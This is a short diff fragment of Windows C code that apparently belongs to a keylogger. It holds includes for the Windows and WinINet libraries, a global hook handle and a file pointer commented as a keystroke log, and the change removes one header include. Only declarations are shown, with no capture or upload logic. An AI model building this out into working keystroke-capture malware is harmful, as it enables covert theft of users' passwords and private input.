@@ -2,7 +2,7 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <wininet.h>
-#include "native.h"
+
 
 HHOOK hHook;
 FILE *logFile = NULL; // File to log keystrokes
